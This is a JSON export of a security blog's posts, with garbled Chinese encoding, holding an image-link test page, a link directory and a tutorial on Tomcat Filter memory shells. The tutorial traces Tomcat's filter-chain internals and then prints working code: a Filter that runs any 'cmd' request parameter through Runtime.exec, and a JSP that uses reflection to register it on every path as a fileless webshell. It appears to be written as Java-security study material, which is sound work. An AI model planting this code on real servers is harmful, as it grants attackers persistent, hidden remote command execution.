[{"id":"7b9812fe6cbf2aba598dcdf2de807daf","title":"Test","content":"\n\n\n\n\n\n\n\n\n\n\næµ‹è¯•ä¸“ç”¨ï¼š\næµ‹è¯•å³å°†æ·»åŠ å¾—æ–°åŠŸèƒ½\næµ‹è¯•Bugå†™Bug\n\nWell Know\nå…¬ç›Šå›¾åºŠImages\næµ‹è¯•å›¾åºŠçš„å¯é æ€§ï¼Œå­˜å‚¨ç¼“å­˜çš„ç²¾ç¾å›¾ç‰‡\n\n\nOldImages\nhttps://img1.imgtp.com/2022/12/29/uSDeUTRl.jpghttps://img1.imgtp.com/2022/12/29/37ZdW4kd.pnghttps://img1.imgtp.com/2022/12/29/EnfYkbZ1.pnghttps://img1.imgtp.com/2022/12/29/pg6VEHHl.jpghttps://img1.imgtp.com/2022/12/29/Y0qZaXTg.jpghttps://img1.imgtp.com/2022/12/29/gmqIPKRh.jpghttps://img1.imgtp.com/2022/12/29/S4Wm7uJm.jpghttps://img1.imgtp.com/2022/12/29/06Q4a1Mk.jpghttps://img1.imgtp.com/2022/12/29/znrYWOBV.jpghttps://img1.imgtp.com/2022/12/29/sJbuBfwT.jpghttps://img1.imgtp.com/2022/12/29/DjLxDUy1.jpghttps://img1.imgtp.com/2022/12/29/1b6m2t1c.pnghttps://img1.imgtp.com/2022/12/29/oltssDTv.jpghttps://img1.imgtp.com/2022/12/29/IWXwASQo.jpghttps://img1.imgtp.com/2022/12/29/9IWBdBLB.jpghttps://img1.imgtp.com/2022/12/29/GYj3TsCZ.jpghttps://img1.imgtp.com/2022/12/29/ikr5yemq.jpghttps://img1.imgtp.com/2022/12/29/zau1NkxE.jpghttps://img1.imgtp.com/2022/12/29/kc1Kw9ix.jpghttps://img1.imgtp.com/2022/12/29/asEu0uqy.jpghttps://img1.imgtp.com/2022/12/19/D4gTVMUx.jpghttps://img1.imgtp.com/2022/12/29/Q9dqVOtu.pnghttps://img1.imgtp.com/2022/12/29/OLvHtttT.jpghttps://img1.imgtp.com/2022/12/29/DKzm2xtl.jpghttps://img1.imgtp.com/2022/12/29/uWDljUFQ.jpghttps://img1.imgtp.com/2022/12/29/2JqCpzhK.jpghttps://img1.imgtp.com/2022/12/29/lDMOSnFg.jpghttps://img1.imgtp.com/2022/12/29/14Blr0Nz.jpghttps://img1.imgtp.com/2022/12/29/YGORlVUg.jpghttps://img1.imgtp.com/2022/12/29/aiF2n9Ud.jpghttps://img1.imgtp.com/2022/12/29/orUU0jPu.jpghttps://img1.imgtp.com/2022/12/29/2aB29hsU.jpghttps://img1.imgtp.com/2022/12/29/Z5cFUmQU.jpghttps://img1.imgtp.com/2022/12/29/GYIv5Rwi.jpghttps://img1.imgtp.com/2022/12/29/33YsHojN.pnghttps://img1.imgtp.com/2022/12/29/uSDeUTRl.jpghttps://img1.imgtp.com/2022/12/29/37ZdW4kd.pnghttps://img1.imgtp.com/2022/12/29/EnfYkbZ1.pnghttps://img1.imgtp.com/2022/12/29/zXwyOpf9.jpghttps://img1.imgtp.com/2022/12/29/pg6VEHHl.jpghttps://img1.imgtp.com/2022/12/29/ZWyC72fy.jpghttps://img1.imgtp.com/2022/12/29/ZWSbGVmZ.jpghttps://img1.imgtp.com/2022/12/29/Y0qZaXTg.jpghttps://img1.imgtp.com/2022/12/29/k6bxWc1q.jpg\n\n\n\n1080P\nhttps://img1.imgtp.com/2022/11/18/AkrvuUDT.jpghttps://img1.imgtp.com/2022/12/29/bKHEuhiz.jpghttps://img1.imgtp.com/2022/12/29/AMcgxKyF.jpghttps://img1.imgtp.com/2022/12/29/Qc5RzbgW.jpghttps://img1.imgtp.com/2022/12/29/5PNmmFwa.jpghttps://img1.imgtp.com/2022/12/29/QOm1QRhg.jpghttps://img1.imgtp.com/2022/12/29/LBh2Lh9p.jpghttps://img1.imgtp.com/2022/12/29/9nBdn2lE.jpghttps://img1.imgtp.com/2022/12/29/quM6Q6jK.jpghttps://img1.imgtp.com/2022/12/29/woGfpekh.jpghttps://img1.imgtp.com/2022/12/29/y0GalXG8.jpghttps://img1.imgtp.com/2022/12/29/5OPWxALV.jpghttps://img1.imgtp.com/2022/12/29/TTyF9qb2.jpghttps://img1.imgtp.com/2022/12/29/rsQ56TVJ.pnghttps://img1.imgtp.com/2022/12/29/J837DC76.pnghttps://img1.imgtp.com/2022/12/29/ZlTSZZVg.jpghttps://img1.imgtp.com/2022/12/29/DkX1iAcq.jpghttps://img1.imgtp.com/2022/12/29/My5ko1hC.jpghttps://img1.imgtp.com/2022/12/29/gqgz5tTt.jpghttps://img1.imgtp.com/2022/12/29/mWDobZRD.jpghttps://img1.imgtp.com/2022/12/29/pcDQXpB5.jpghttps://img1.imgtp.com/2022/12/29/PaZyMd5Q.jpghttps://img1.imgtp.com/2022/12/29/0Bh2Pykf.jpghttps://img1.imgtp.com/2022/12/29/MP7f0xlb.jpghttps://img1.imgtp.com/2022/12/29/HELempaT.jpghttps://img1.imgtp.com/2022/12/29/TyikGtU8.jpghttps://img1.imgtp.com/2022/12/29/K3K2cE0l.jpghttps://img1.imgtp.com/2022/12/29/EAKJlRfZ.jpghttps://img1.imgtp.com/2022/12/29/bnKqJ23e.jpghttps://img1.imgtp.com/2022/12/29/ZAiGs7PK.jpghttps://img1.imgtp.com/2022/12/29/NlLyVvPA.jpghttps://img1.imgtp.com/2022/12/29/yE2Gckif.jpghttps://img1.imgtp.com/2022/12/29/G61RDJuq.jpghttps://img1.imgtp.com/2022/12/29/y3KqmF3f.jpghttps://img1.imgtp.com/2022/12/29/Xsozgx25.jpghttps://img1.imgtp.com/2022/12/29/ta0LIgzs.jpghttps://img1.imgtp.com/2022/12/29/cnWkuXpy.jpghttps://img1.imgtp.com/2022/12/29/zusp4wXk.jpghttps://img1.imgtp.com/2022/12/29/vmANLZRu.jpghttps://img1.imgtp.com/2022/12/29/g7PJ7Mpl.jpghttps://img1.imgtp.com/2022/12/29/L9ItP6dI.jpghttps://img1.imgtp.com/2022/12/29/yHz4YRWh.jpghttps://img1.imgtp.com/2022/12/29/xrP6SBGT.jpghttps://img1.imgtp.com/2022/12/29/I8wlxv9O.jpghttps://img1.imgtp.com/2022/12/29/tc80TC10.jpghttps://img1.imgtp.com/2022/12/29/olN5TL0t.jpghttps://img1.imgtp.com/2022/12/29/dujJS3MK.pnghttps://img1.imgtp.com/2022/12/29/vsYlZcmL.jpghttps://img1.imgtp.com/2022/12/29/zrzJEGyP.jpghttps://img1.imgtp.com/2022/12/29/wZHh2IsA.jpghttps://img1.imgtp.com/2022/12/29/mMcznwKi.jpghttps://img1.imgtp.com/2022/12/29/TcfdHWui.jpghttps://img1.imgtp.com/2022/12/29/ay2NCpwj.jpghttps://img1.imgtp.com/2022/12/29/aKLE61HP.jpghttps://img1.imgtp.com/2022/12/29/YevKp9Ii.jpghttps://img1.imgtp.com/2022/12/29/gOxsMoNn.jpghttps://img1.imgtp.com/2022/12/29/kc1Kw9ix.jpghttps://img1.imgtp.com/2022/12/29/TZMjRhlT.jpghttps://img1.imgtp.com/2022/12/29/6xGWiRzG.jpghttps://img1.imgtp.com/2022/12/29/etQ5bp23.jpghttps://img1.imgtp.com/2022/12/29/2pDGbB9i.jpghttps://img1.imgtp.com/2022/12/29/o3nZeWSI.jpghttps://img1.imgtp.com/2022/12/29/cPhShYkY.jpghttps://img1.imgtp.com/2022/12/29/DyR6jvOg.jpghttps://img1.imgtp.com/2022/12/29/02zKxLfJ.jpghttps://img1.imgtp.com/2022/12/29/kT175B18.jpghttps://img1.imgtp.com/2022/12/29/vmBwbgd8.jpghttps://img1.imgtp.com/2022/12/29/yAkQ4ppj.jpghttps://img1.imgtp.com/2022/12/29/6X3y10og.jpg\n\n\n\n1080P å‹ç¼©å èƒŒæ™¯\nhttps://img1.imgtp.com/2023/01/01/uxAkXTML.jpghttps://img1.imgtp.com/2023/01/01/0ZGibDcO.jpghttps://img1.imgtp.com/2023/01/01/10JegxyR.jpghttps://img1.imgtp.com/2023/01/01/o0bWYTOo.jpghttps://img1.imgtp.com/2023/01/01/muYBxUh6.jpghttps://img1.imgtp.com/2023/01/01/T0Mv9oRw.jpghttps://img1.imgtp.com/2023/01/01/XieXfB1H.jpghttps://img1.imgtp.com/2023/01/01/WvVJHFJ5.jpghttps://img1.imgtp.com/2023/01/01/hudUJzJk.jpghttps://img1.imgtp.com/2023/01/01/y5UyRdIl.jpghttps://img1.imgtp.com/2023/01/01/21mJWNqE.jpghttps://img1.imgtp.com/2023/01/01/Viep2KWx.jpghttps://img1.imgtp.com/2023/01/01/RGcb7Gjd.jpghttps://img1.imgtp.com/2023/01/01/KXL9cDX7.jpghttps://img1.imgtp.com/2023/01/01/2pg10gT0.jpghttps://img1.imgtp.com/2023/01/01/WWZlTZQE.jpghttps://img1.imgtp.com/2023/01/01/0i2UUfdS.jpghttps://img1.imgtp.com/2023/01/01/Xy4mkJKk.jpghttps://img1.imgtp.com/2023/01/01/3MIbTpVF.jpghttps://img1.imgtp.com/2023/01/01/OnKEvb7B.jpghttps://img1.imgtp.com/2023/01/01/oF4YSJZ1.jpghttps://img1.imgtp.com/2023/01/01/VaN1SPL5.jpghttps://img1.imgtp.com/2023/01/01/YUWqdkLh.jpghttps://img1.imgtp.com/2023/01/01/Kg64CiHH.jpghttps://img1.imgtp.com/2023/01/01/FAgVlpKR.jpghttps://img1.imgtp.com/2023/01/01/2I796Wbn.jpghttps://img1.imgtp.com/2023/01/01/iWd7DOEr.jpg\n\n\n","slug":"Test","date":"2021-12-22T08:34:16.000Z","categories_index":"TestBlog","tags_index":"Test,å¤šæ ‡ç­¾","author_index":"Akpigs"},{"id":"c18131c8f0a2bfb1f8168dcc8bb3a259","title":"Tomcatå†…å­˜é©¬ä¹‹Filter","content":"Tomcatå†…å­˜é©¬ä¹‹Filterå‰è¨€å…³äº Filter çš„çŸ¥è¯†ï¼Œåœ¨å‰é¢Filterç« èŠ‚å·²ç»å­¦ä¹ è¿‡ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œç›´æ¥è¿›å…¥åˆ†æç¯èŠ‚ã€‚\nFilteræµç¨‹åˆ†æå…ˆç¼–å†™ä¸€ä¸ªç®€å•çš„ Filter å®ç°ç±»\npackage com.servlet.study;\n\nimport javax.servlet.*;\nimport javax.servlet.annotation.WebFilter;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\n\n&#x2F;**\n * Created by dotast on 2022&#x2F;10&#x2F;21 10:41\n *&#x2F;\n@WebFilter(filterName &#x3D; &quot;FilterTest&quot;, urlPatterns &#x3D; &#123;&quot;&#x2F;*&quot;&#125;)\npublic class FilterTest implements Filter &#123;\n\n    public void init(FilterConfig filterConfig) throws ServletException &#123;\n\n    &#125;\n\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;\n        String cmd &#x3D; servletRequest.getParameter(&quot;cmd&quot;);\n        try&#123;\n            if(cmd !&#x3D; null)&#123;\n                InputStream inputStream &#x3D; Runtime.getRuntime().exec(cmd).getInputStream();\n                ByteArrayOutputStream bao &#x3D; new ByteArrayOutputStream();\n                byte[] bytes &#x3D; new byte[1024];\n                int a &#x3D; -1;\n                while((a &#x3D; inputStream.read(bytes))!&#x3D;-1)&#123;\n                    bao.write(bytes, 0, a);\n                &#125;\n                servletResponse.getWriter().write(new String(bao.toByteArray()));\n            &#125;\n        &#125;catch (Exception e)&#123;\n            e.printStackTrace();\n        &#125;\n        &#x2F;&#x2F; ä½¿ä¸‹ä¸€ä¸ª Filter èƒ½å¤Ÿç»§ç»­æ‰§è¡Œ\n        filterChain.doFilter(servletRequest,servletResponse);\n    &#125;\n\n    public void destroy() &#123;\n\n    &#125;\n&#125;\n\nè®¿é—®åå¸¦ä¸Šå‚æ•°æ‰§è¡Œå‘½ä»¤\nåœ¨doFilter()å¤„æ–¹æ³•æ‰“ä¸Šæ–­ç‚¹ï¼Œçœ‹çœ‹è°ƒç”¨æ ˆ\nä»StandardWrapperValve#invoke()æ–¹æ³•è·Ÿèµ·\né¦–å…ˆé€šè¿‡ApplicationFilterFactory.createFilterChain()æ–¹æ³•åˆ›å»ºäº†ä¸€ä¸ªApplicationFilterChainç±»å‹å¯¹è±¡ï¼Œè·Ÿè¿›createFilterChain()æ–¹æ³•\nåˆå§‹åŒ–äº†ApplicationFilterChainå¯¹è±¡ï¼Œç»§ç»­å¾€ä¸‹èµ°\næ¥ä¸‹æ¥è·å–åˆ°äº†StandardContextç±»å¯¹è±¡contextï¼Œå¹¶é€šè¿‡context.findFilterMaps()æ–¹æ³•æ‹¿åˆ°äº†filterMapsæ•°ç»„ï¼Œç»§ç»­å¾€ä¸‹èµ°\nåœ¨ if æ¡ä»¶ä¸­ï¼Œè¯·æ±‚è·¯å¾„å’ŒfilterMapè®¾ç½®çš„è§„åˆ™è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœæ»¡è¶³åˆ™è¿›å…¥ if æ¡ä»¶ä¸­ï¼Œæ¥ç€æ ¹æ®filterMapå¯¹è±¡ä¸­å­˜å‚¨çš„filteråç§°åœ¨StandardContextç±»çš„filterConfigså¯»æ‰¾filterConfigï¼Œå¦‚æœä¸ä¸ºç©ºåˆ™é€šè¿‡addFilter()æ–¹æ³•æ·»åŠ åˆ°filterChainçš„å±æ€§ä¸­\naddFilter()æ–¹æ³•æºç å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä»£ç é€»è¾‘å°±æ˜¯è¿›è¡Œäº†å»é‡ã€æ‰©å®¹å¹¶æ·»åŠ filterConfigã€‚\næœ€åå›åˆ°StandardWrapperValveç±»ä¸­å¾€ä¸‹èµ°\nè·Ÿè¿›filterChain.doFilter()æ–¹æ³•ä¸­\nç»§ç»­è·Ÿè¿›internalDoFilter()æ–¹æ³•\nåˆ›å»ºäº†ApplicationFilterConfigç±»å¯¹è±¡filterConfigï¼Œç„¶åé€šè¿‡filterConfig.getFilter()æ–¹æ³•å–å‡ºfilterï¼Œæ¥ç€è°ƒç”¨filter.doFilter()æ–¹æ³•ï¼Œè·Ÿè¿›åå°±æ˜¯æˆ‘ä»¬ç¼–å†™çš„æ¶æ„ç±»FilterTest\nè‡³æ­¤æ­¥éª¤ç®—æ˜¯èµ°å®Œäº†ï¼Œæ€»ç»“ä¸€ä¸‹æµç¨‹ï¼š\n\né€šè¿‡ApplicationFilterFactory.createFilterChain()æ–¹æ³•åˆå§‹åŒ–ApplicationFilterChainå¯¹è±¡ï¼›\nåˆå§‹åŒ–ç©ºçš„ApplicationFilterChainå¯¹è±¡ï¼›\nè·å–StandardContextç±»å¯¹è±¡ï¼Œå¹¶ä¸­StandardContextç±»å¯¹è±¡ä¸­å–å‡ºFilterMapsæ•°ç»„,FilterMapsæ•°ç»„ä¸­çš„FilterMapå­˜å‚¨åç§°å’ŒåŒ¹é…è§„åˆ™ï¼›\næ ¹æ®FilterMapçš„åç§°åœ¨StandardContextç±»çš„filterConfigsä¸­æŸ¥æ‰¾ï¼Œå¦‚æœä¸ä¸ºç©ºåˆ™æ·»åŠ åˆ°filterChainå¯¹è±¡çš„å±æ€§ä¸­ï¼›\n\n\næ‰§è¡ŒfilterChain#doFilter()æ–¹æ³•è¿›å…¥ç¼–å†™çš„æ¶æ„å®ç°ç±»FilterTestçš„doFilter()æ–¹æ³•ä¸­æ‰§è¡Œä»£ç ã€‚\n\næ¥ä¸‹æ¥å†çœ‹çœ‹Filterçš„åˆå§‹åŒ–åŠ è½½æµç¨‹ï¼ŒæŠŠæ–­ç‚¹æ‰“åœ¨ç±»åå¤„\nçœ‹çœ‹è°ƒç”¨æ ˆ\nè·Ÿè¿›filterStart()æ–¹æ³•\néå† Map å¯¹è±¡filterDefså¹¶è·å–åˆ°entry.getValue()ï¼Œä½œä¸ºå‚æ•°ä¼ å…¥åˆå§‹åŒ–çš„ApplicationFilterConfigå¯¹è±¡filterConfigï¼Œç„¶åé€šè¿‡put()æ–¹æ³•æŠŠfilterConfigæ·»åŠ åˆ°filterConfigsä¸­ã€‚\nè‡³æ­¤æˆ‘ä»¬çŸ¥é“å’Œ filter æœ‰å…³çš„ä¸‰ä¸ªå­—æ®µåˆ†åˆ«ä¸ºï¼šfilterMapsã€filterDefså’ŒfilterConfigs\nFilterå†…å­˜é©¬çš„å®ç°æˆ‘ä»¬å…ˆæ€»ç»“ä¸€ä¸‹è¿™ä¸‰ä¸ªå­—æ®µå­˜å‚¨çš„å†…å®¹\nfilterMaps\n\nå¯ä»¥çœ‹åˆ°åœ¨filterMapsä¸­ä»¥æ•°ç»„çš„æ–¹å¼å­˜å‚¨ç€ filter çš„åç§°å’Œè·¯å¾„æ˜ å°„ä¿¡æ¯ï¼Œå…¶ä¸­dispatcherMappingã€filterNameå’ŒurlPatternsæ˜¯å¿…é¡»çš„ã€‚\nfilterDefs\n\nfilterDefsä»¥é”®å€¼å¯¹çš„æ–¹å¼å­˜å‚¨filterDefï¼ŒfilterDefä¸º Map å¯¹è±¡ï¼Œvalue å­˜å‚¨ç€é‡è¦çš„filterã€filterClasså’ŒfilterNameã€‚\nfilterConfigs\n\nfilterConfigså­˜å‚¨ç€å½“å‰çš„ä¸Šä¸‹æ–‡StandardContextï¼ˆWEB åº”ç”¨ï¼‰ï¼Œfilterå¯¹è±¡å’ŒfilterDefç­‰ç­‰ä¿¡æ¯ã€‚\nç»è¿‡å‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶ä¸Šè¿°ä¸‰ä¸ªå±æ€§çš„å†…å®¹è¾¾åˆ°åŠ¨æ€æ·»åŠ æ¶æ„ Filter çš„ç›®çš„ï¼Œ æ€è·¯å¦‚ä¸‹ï¼š\n\nç¼–å†™æ¶æ„çš„ Filter å®ç°ç±»ï¼›\nè·å–StandardContextå¯¹è±¡ï¼›\nåˆ©ç”¨FilterDefå¯¹filterè¿›è¡Œå°è£…ï¼›\nåˆ›å»ºFilterMapï¼Œå°†filterNameå’ŒurlPatternsè¿›è¡Œç»‘å®šï¼ˆå› ä¸º Filter æ˜¯æŒ‰ç…§å…ˆåé¡ºåºè¿›è¡Œè°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€å¥½æŠŠæ¶æ„ Filter æ”¾åˆ°æœ€å‰é¢ï¼‰\nä½¿ç”¨ApplicationFilterConfigå°è£…filterDefï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterConfigsä¸­\n\næœ€å Filter å†…å­˜é©¬å®ç°å¦‚ä¸‹ï¼š\n&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.InputStream&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.ByteArrayOutputStream&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.catalina.connector.Request&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.lang.reflect.Constructor&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.catalina.Context&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.util.Map&quot; %&gt;&lt;%--\n  Created by dotast on 2022&#x2F;10&#x2F;31 16:51\n--%&gt;\n&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%!\n    class FilterTest implements Filter &#123;\n\n        public void init(FilterConfig filterConfig) throws ServletException &#123;\n\n        &#125;\n\n        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;\n            String cmd &#x3D; servletRequest.getParameter(&quot;cmd&quot;);\n            try&#123;\n                if(cmd !&#x3D; null)&#123;\n                    InputStream inputStream &#x3D; Runtime.getRuntime().exec(cmd).getInputStream();\n                    ByteArrayOutputStream bao &#x3D; new ByteArrayOutputStream();\n                    byte[] bytes &#x3D; new byte[1024];\n                    int a &#x3D; -1;\n                    while((a &#x3D; inputStream.read(bytes))!&#x3D;-1)&#123;\n                        bao.write(bytes, 0, a);\n                    &#125;\n                    servletResponse.getWriter().write(new String(bao.toByteArray()));\n                &#125;\n            &#125;catch (Exception e)&#123;\n                e.printStackTrace();\n            &#125;\n            &#x2F;&#x2F; ä½¿ä¸‹ä¸€ä¸ª Filter èƒ½å¤Ÿç»§ç»­æ‰§è¡Œ\n            filterChain.doFilter(servletRequest,servletResponse);\n        &#125;\n\n        public void destroy() &#123;\n\n        &#125;\n    &#125;\n%&gt;\n\n&lt;%\n    String filterName &#x3D; &quot;FilterTest&quot;;\n    &#x2F;&#x2F; è·å–StandardContextå¯¹è±¡\n    Field field &#x3D; request.getClass().getDeclaredField(&quot;request&quot;);\n    field.setAccessible(true);\n    Request req &#x3D; (Request) field.get(request);\n    StandardContext standardContext &#x3D; (StandardContext) req.getContext();\n\n    &#x2F;&#x2F; åˆ©ç”¨FilterDefå¯¹filterè¿›è¡Œå°è£…\n    FilterTest filterTest &#x3D; new FilterTest();\n    FilterDef filterDef &#x3D; new FilterDef();\n    filterDef.setFilter(filterTest);\n    filterDef.setFilterName(filterName);\n    filterDef.setFilterClass(filterTest.getClass().getName());\n\n    &#x2F;&#x2F; åˆ›å»ºFilterMapï¼Œå°†filterNameå’ŒurlPatternsè¿›è¡Œç»‘å®š\n    FilterMap filterMap &#x3D; new FilterMap();\n    filterMap.setFilterName(filterName);\n    filterMap.addURLPattern(&quot;&#x2F;*&quot;);\n    filterMap.setDispatcher(DispatcherType.REQUEST.name());\n    standardContext.addFilterMapBefore(filterMap);\n\n    &#x2F;&#x2F; å°è£…filterConfigå’ŒfilterDefåˆ°filterConfigs\n    Field field_filterConfigs &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);\n    field_filterConfigs.setAccessible(true);\n    Map filterConfigs &#x3D; (Map) field_filterConfigs.get(standardContext);\n\n    &#x2F;&#x2F; åˆ©ç”¨åå°„åˆ›å»ºFilterConfigï¼Œå¹¶ä¸”å°†filterDefå’ŒstandardContextä½œä¸ºå‚æ•°è¿›è¡Œä¼ å…¥è¿›è¡Œå°è£…filterDe\n    Constructor constructor &#x3D; ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);\n    constructor.setAccessible(true);\n    ApplicationFilterConfig applicationFilterConfig &#x3D; (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);\n\n    &#x2F;&#x2F; æ·»åŠ åˆ°filterConfigsä¸­\n    filterConfigs.put(filterName,applicationFilterConfig);\n%&gt;\n\nè®¿é—®ä¸Šä¼ çš„å†…å­˜é©¬æ–‡ä»¶è·¯å¾„ä½¿å…¶æ‰§è¡Œä»£ç ï¼Œæ³¨å†Œå†…å­˜é©¬\næ¥ç€è®¿é—®å…¶ä»–è·¯ç”±éƒ½å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤\n","slug":"Filterå†…å­˜é©¬","date":"2021-11-09T16:18:15.000Z","categories_index":"Javaå®‰å…¨","tags_index":"Javaå®‰å…¨","author_index":"Akpigs"},{"id":"fb1b5febdd29c32cc279b65b5a5e127a","title":"ç®€æ˜“å¯¼èˆª2","content":"å€¼å¾—æ¨èèµ„æºä¹‹â€”â€”å®ç”¨ç½‘ç«™æ—¥å¸¸ç”Ÿæ´»ç”µå½±è§‚çœ‹\nç”µå½±å¯¼èˆª | å¿«å¯¼èˆªç½‘\nå¯ä¹å½±è§†\n\næœ‰è¶£ç½‘ç«™\nLKs - è‰¯å¿ƒåˆ°éš¾ä»¥ç½®ä¿¡çš„ç½‘ç«™æ¨è\nå±…å®¶ç®€æ˜“é£Ÿè°±\nå¥èº«ç™¾ç§‘\nçŒœä¸­å›½çœä»½\næ–°ç»æµæ­»äº¡å…¬å¸æ•°æ®åº“\næŠ˜å çº¸é£æœºæŠ˜å è¯´æ˜\nWantWords åå‘è¯å…¸\nWindyå°é£é¢„æµ‹\nä»Šæ—¥çƒ­æ¦œå®˜ç½‘\nTradingView â€“ è¿½è¸ªæ‰€æœ‰å¸‚åœº\nè®ºæ–‡é˜…è¯»-ReadPaperè®ºæ–‡é˜…è¯»å¹³å°\næ¥è‡ªå¤ªç©ºçš„æµæ˜Ÿé›¨\nå¹¿é˜”å®å¤§çš„å®‡å®™\nç»ˆç«¯æ–‡å­—ç”Ÿæˆå™¨\nåœ¨çº¿PS\nä¹¦æ³•ç”Ÿæˆå™¨\nè‹±æ–‡è‰ºæœ¯å­—ç”Ÿæˆ\né’¢ç´éŸ³ä¹\næ‰‹æœºå…¨å†å²\n17ä¸‡å¼ é«˜åˆ†è¾¨ç‡ä¸–ç•Œåç”»\nç¾ä¸½çš„é£æ™¯\nä¸–ç•Œé£æœºå®æ—¶ä¿¡æ¯\næ£®æ—ä¹‹å£°\n\nä¾¿æ°‘\nä¸­å›½æ³•å¾‹æœåŠ¡ç½‘\n\n\nå†å²ç¥è¯\nä¸­å›½ç¥è¯\nå…¨å†å²\nä¸­åçå®ç®¡\n\né«˜æ¸…å£çº¸\næç®€å£çº¸_æµ·é‡ç”µè„‘æ¡Œé¢å£çº¸ç¾å›¾_4Kè¶…é«˜æ¸…_æœ€æ½®å£çº¸ç½‘ç«™                \nåŠ¨æ€å£çº¸ - åŠ¨æ€æ¡Œé¢ - è§†é¢‘å£çº¸ â€“ ç¬¬2 é¡µ å…±306 é¡µ - è‡´ç¾åŒ– - æ¼«é”‹ç½‘\n\nPPTæ¨¡æ¿\nPPTæ¨¡æ¿_PPTæ¨¡ç‰ˆå…è´¹ä¸‹è½½_å…è´¹PPTæ¨¡æ¿ä¸‹è½½ -ã€ç¬¬ä¸€PPTã€‘                        \nPPTæ¨¡æ¿ä¸‹è½½_PPTæ¨¡æ¿å…è´¹ä¸‹è½½_å¹»ç¯ç‰‡æ¨¡æ¿ä¸‹è½½ - ä¼˜å“PPT                        \nHiPPTER | PPTèµ„æºå¯¼èˆª | PPTæ¨¡æ¿å›¾è¡¨ç­‰è®¾è®¡ç´ æå…è´¹ä¸‹è½½\n\nå›¾ä¹¦èµ„æº\nå¾®ä¿¡è¯»ä¹¦-æ­£ç‰ˆä¹¦ç±å°è¯´å…è´¹é˜…è¯»                \n[æ¬ä¹¦åŒ ] - ç”µå­ä¹¦(EBook)                \nIT ç”µå­ä¹¦ - å…è´¹ä¸‹è½½ - æ–°ç‰ˆæœ¬                \nç”µå­å›¾ä¹¦é¦†ã€‚å…è´¹ä¸‹è½½å›¾ä¹¦ã€‚æŸ¥æ‰¾å›¾ä¹¦\n\nç¿»è¯‘\nåœ¨çº¿ç¿»è¯‘_æœ‰é“                    \nGoogle Translate      \nDeelç¿»è¯‘å™¨\n\næ‰“å­—ç»ƒä¹ \næ‰“å­—ç»ƒä¹ _åœ¨çº¿-é›¶åŸºç¡€åˆ°è¿æŒ‡å¦‚é£_è“è±†æ‰“å­—|LDou.com                        \nåœ¨çº¿æ‰“å­—æµ‹è¯•ï¼ˆdazi.kukuw.comï¼‰                        \nTyping Practice                                       \nQwerty Learnerï¼ˆå¤‡ç”¨ä¸€ï¼‰          \nQwerty Learnerï¼ˆå¤‡ç”¨äºŒï¼‰                        \nTyping Practice for Programmers | typing.io                        \nPractice typing by retyping ENTIRE novels â€” TypeLit.io                        \nLearn Touch Typing Free - TypingClub\n\né‚®ç®±åŠ å¯†é‚®ç®±\nTutanotaï¼šå…è´¹å®‰å…¨çš„åŠ å¯†é‚®ç®±                    \nFree Private &amp; Secure Email Account with Proton Mail | Proton                    \næ”¶ä»¶ç®± | 0xltlrj9vesyng@proton.me | Proton Mail\n\nä¸´æ—¶é‚®ç®±i\nè«å…‹ç‰¹ç”µé‚® ||ä¸´æ—¶ä¸€æ¬¡æ€§ç”µå­é‚®ä»¶æœåŠ¡                    \nä¸´æ—¶é‚®ç®± | Temp Mail | 24å°æ—¶é‚®ç®±\n\næ­£å¸¸é‚®ä»¶\n163ç½‘æ˜“å…è´¹é‚®â€“ä¸­æ–‡é‚®ç®±ç¬¬ä¸€å“ç‰Œ\nç™»å½•QQé‚®ç®±\n126ç½‘æ˜“å…è´¹é‚®â€“ä½ çš„ä¸“ä¸šç”µå­é‚®\nGoogle Gmail\nYahoo\nOutlook â€“ free personal email and calendar from Microsoft\n\nå¨±ä¹æ¸¸æˆ\nå›½å¤–åœ¨çº¿å°æ¸¸æˆåˆé›†\nå½©è‰²ç»“ç›Šæ™ºå°æ¸¸æˆ\nä¸AIå¯¹æˆ˜çŸ³å¤´å‰ªåˆ€å¸ƒ\nå–µæ˜Ÿäººå¤§æˆ˜è‡ªåŠ¨å”®è´§æœºã€‘\nåœ¨çº¿é£è¡Œæ¨¡æ‹Ÿå™¨\n\néŸ³ä¹\nQQéŸ³ä¹\nç½‘æ˜“äº‘éŸ³ä¹\nSpotify\nYoutube\n\nWindowså¥½ç”¨å·¥å…·æ¨èå†…æ ¸å·¥å…·\nArkå·¥å…·é›†\nWindowså®‰å…¨ç ”ç©¶å·¥å…·é›†\n\né€†å‘å·¥ç¨‹å¸ˆä¸“å±\nå·¥å…·é›†\nå¾çˆ±ç ´è§£å·¥å…·åŒ…\n\né«˜æ•ˆå·¥å…·\nTypora\nXmindå¯†ç 